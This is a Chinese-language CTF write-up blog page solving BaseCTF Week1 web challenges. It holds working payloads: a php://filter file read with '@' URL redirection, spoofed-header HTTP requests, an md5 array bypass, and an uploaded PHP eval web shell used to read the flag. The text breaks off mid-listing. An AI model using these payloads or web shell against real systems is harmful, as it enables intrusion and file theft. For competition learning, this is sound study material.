<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="0x01 前言 比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊\n0x02 WP [Week1] A Dark Room 查看源码\n[Week1] Aura 酱的礼物 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <?php highlight_file(__FILE__); // Aura 酱，欢迎回家~ // 这里有一份礼物，请你签收一下哟~ $pen = $_POST['pen']; if (file_get_contents($pen) !== 'Aura') { die('这是 Aura 的礼物，你不是 Aura！'); } // 礼物收到啦，接下来要去博客里面写下感想哦~ $challenge = $_POST['challenge']; if (strpos($challenge, 'http://jasmineaura.github.io') !== 0) { die('这不是 Aura 的博客！'); } $blog_content = file_get_contents($challenge); if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false) { die('请去博客里面写下感想哦~'); } // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST['gift']; include($gift); 这是 Aura 的礼物，你不是 Aura！ @重定向一下即可\n"><title>BaseCTF</title><link rel=canonical href=https://baozongwi.github.io/p/basectf/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="BaseCTF"><meta property='og:description' content="0x01 前言 比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊\n0x02 WP [Week1] A Dark Room 查看源码\n[Week1] Aura 酱的礼物 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <?php highlight_file(__FILE__); // Aura 酱，欢迎回家~ // 这里有一份礼物，请你签收一下哟~ $pen = $_POST['pen']; if (file_get_contents($pen) !== 'Aura') { die('这是 Aura 的礼物，你不是 Aura！'); } // 礼物收到啦，接下来要去博客里面写下感想哦~ $challenge = $_POST['challenge']; if (strpos($challenge, 'http://jasmineaura.github.io') !== 0) { die('这不是 Aura 的博客！'); } $blog_content = file_get_contents($challenge); if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false) { die('请去博客里面写下感想哦~'); } // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST['gift']; include($gift); 这是 Aura 的礼物，你不是 Aura！ @重定向一下即可\n"><meta property='og:url' content='https://baozongwi.github.io/p/basectf/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='flask'><meta property='article:tag' content='php'><meta property='article:tag' content='jwt'><meta property='article:tag' content='mysql'><meta property='article:published_time' content='2024-09-16T12:07:24+00:00'><meta property='article:modified_time' content='2024-09-16T12:07:24+00:00'><meta name=twitter:title content="BaseCTF"><meta name=twitter:description content="0x01 前言 比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊\n0x02 WP [Week1] A Dark Room 查看源码\n[Week1] Aura 酱的礼物 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <?php highlight_file(__FILE__); // Aura 酱，欢迎回家~ // 这里有一份礼物，请你签收一下哟~ $pen = $_POST['pen']; if (file_get_contents($pen) !== 'Aura') { die('这是 Aura 的礼物，你不是 Aura！'); } // 礼物收到啦，接下来要去博客里面写下感想哦~ $challenge = $_POST['challenge']; if (strpos($challenge, 'http://jasmineaura.github.io') !== 0) { die('这不是 Aura 的博客！'); } $blog_content = file_get_contents($challenge); if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false) { die('请去博客里面写下感想哦~'); } // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST['gift']; include($gift); 这是 Aura 的礼物，你不是 Aura！ @重定向一下即可\n"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#week1-a-dark-room>[Week1] A Dark Room</a></li><li><a href=#week1-aura-酱的礼物>[Week1] Aura 酱的礼物</a></li><li><a href=#week1-http-是什么呀>[Week1] HTTP 是什么呀</a></li><li><a href=#week1-md5绕过欸>[Week1] md5绕过欸</a></li><li><a href=#week1-upload>[Week1] upload</a></li><li><a href=#week1-喵喵喵ﻌ>[Week1] 喵喵喵´•ﻌ•`</a></li><li><a href=#week2-ez_ser>[Week2] ez_ser</a></li><li><a href=#week2-really-ez-pop>[Week2] Really EZ POP</a></li><li><a href=#week2-rceisamazingwithspace>[Week2] RCEisamazingwithspace</a></li><li><a href=#week2-一起吃豆豆>[Week2] 一起吃豆豆</a></li><li><a href=#week2-你听不到我的声音>[Week2] 你听不到我的声音</a></li><li><a href=#week2-所以你说你懂-md5>[Week2] 所以你说你懂 MD5?</a></li><li><a href=#week2-数学大师>[Week2] 数学大师</a></li><li><a href=#week3-ez_php_jail>[Week3] ez_php_jail</a></li><li><a href=#week3-复读机>[Week3] 复读机</a></li><li><a href=#week3-滤个不停>[Week3] 滤个不停</a></li><li><a href=#week3-玩原神玩的>[Week3] 玩原神玩的</a></li><li><a href=#week4-no-jwt>[Week4] No JWT</a></li><li><a href=#week4-flag直接读取不就行了>[Week4] flag直接读取不就行了？</a></li><li><a href=#week4-圣钥之战10>[Week4] 圣钥之战1.0</a></li><li><a href=#week4-only-one-sql>[Week4] only one sql</a></li><li><a href=#fin-jinja-mark>[Fin] Jinja Mark</a></li><li><a href=#fin-just-readme-前置>[Fin] Just Readme (前置)</a></li><li><a href=#heading><strong>[Fin] Back to the future</strong></a></li><li><a href=#fin-1z_php>[Fin] 1z_php</a></li><li><a href=#fin-rce-or-sql-inject>[Fin] RCE or Sql Inject</a></li><li><a href=#fin-sql-inject-or-rce>[Fin] Sql Inject or RCE</a></li><li><a href=#fin-lucky-number>[Fin] Lucky Number</a></li><li><a href=#fin-ez_php>[Fin] ez_php</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E8%B5%9B%E9%A2%98/>赛题</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/basectf/>BaseCTF</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Sep 16, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>22 minute read</time></div></footer></div></header><section class=article-content><h1 id=0x01-前言>0x01 前言</h1><p>比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊</p><h1 id=0x02-wp>0x02 WP</h1><h2 id=week1-a-dark-room>[Week1] A Dark Room</h2><p>查看源码</p><h2 id=week1-aura-酱的礼物>[Week1] Aura 酱的礼物</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// Aura 酱，欢迎回家~
</span></span></span><span class=line><span class=cl><span class=c1>// 这里有一份礼物，请你签收一下哟~
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$pen</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pen&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$pen</span><span class=p>)</span> <span class=o>!==</span> <span class=s1>&#39;Aura&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;这是 Aura 的礼物，你不是 Aura！&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 礼物收到啦，接下来要去博客里面写下感想哦~
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$challenge</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;challenge&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$challenge</span><span class=p>,</span> <span class=s1>&#39;http://jasmineaura.github.io&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;这不是 Aura 的博客！&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$blog_content</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$challenge</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$blog_content</span><span class=p>,</span> <span class=s1>&#39;已经收到Kengwang的礼物啦&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;请去博客里面写下感想哦~&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$gift</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;gift&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=nv>$gift</span><span class=p>);</span> <span class=nx>这是</span> <span class=nx>Aura</span> <span class=nx>的礼物，你不是</span> <span class=nx>Aura！</span>
</span></span></code></pre></td></tr></table></div></div><p><code>@</code>重定向一下即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:24028/&amp;gift=php://filter/convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table></div></div><h2 id=week1-http-是什么呀>[Week1] HTTP 是什么呀</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /?basectf=we1c%2500me HTTP/1.1
</span></span><span class=line><span class=cl>Host: challenge.basectf.fun:25643
</span></span><span class=line><span class=cl>Content-Length: 11
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://challenge.basectf.fun:25643
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Base
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: Base
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>x-forwarded-for: 127.0.0.1
</span></span><span class=line><span class=cl>cookie: c00k13=i can&#39;t eat it
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Base=fl%40g
</span></span></code></pre></td></tr></table></div></div><h2 id=week1-md5绕过欸>[Week1] md5绕过欸</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>require</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name2&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password2&#39;</span><span class=p>])</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$name</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$name2</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name2&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$password</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$password2</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password2&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$name</span> <span class=o>!=</span> <span class=nv>$password</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span> <span class=o>==</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$password</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$name2</span> <span class=o>!==</span> <span class=nv>$password2</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$name2</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$password2</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;再看看啊，马上绕过嘞！&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;错啦错啦&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;没看到参数呐&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?name[]=1&amp;name2[]=1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST:
</span></span><span class=line><span class=cl>password[]=2&amp;password2[]=2
</span></span></code></pre></td></tr></table></div></div><h2 id=week1-upload>[Week1] upload</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST / HTTP/1.1
</span></span><span class=line><span class=cl>Host: challenge.basectf.fun:31060
</span></span><span class=line><span class=cl>Content-Length: 204
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://challenge.basectf.fun:31060
</span></span><span class=line><span class=cl>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZhDnBFvG8YCvvDXw
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: http://challenge.basectf.fun:31060/
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundaryZhDnBFvG8YCvvDXw
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;shell.php&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?=eval($_POST[a]);?&gt;
</span></span><span class=line><span class=cl>------WebKitFormBoundaryZhDnBFvG8YCvvDXw--
</span></span></code></pre></td></tr></table></div></div><p>得到路径<code>/uploads/4e5f4647-ae62-4dcf-ae77-0a4c23b449b9.jpg</code></p><p>然后不对，换了一下</p><p><code>/uploads/shell.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>challenge</span><span class=o>.</span><span class=n>basectf</span><span class=o>.</span><span class=n>fun</span><span class=p>:</span><span class=mi>31060</span><span class=o>/</span><span class=n>uploads</span><span class=o>/</span><span class=n>shell</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>POST</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=n>echo</span> <span class=err>`</span><span class=n>tac</span> <span class=o>/</span><span class=n>f</span><span class=o>*</span><span class=err>`</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=week1-喵喵喵ﻌ>[Week1] 喵喵喵´•ﻌ•`</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
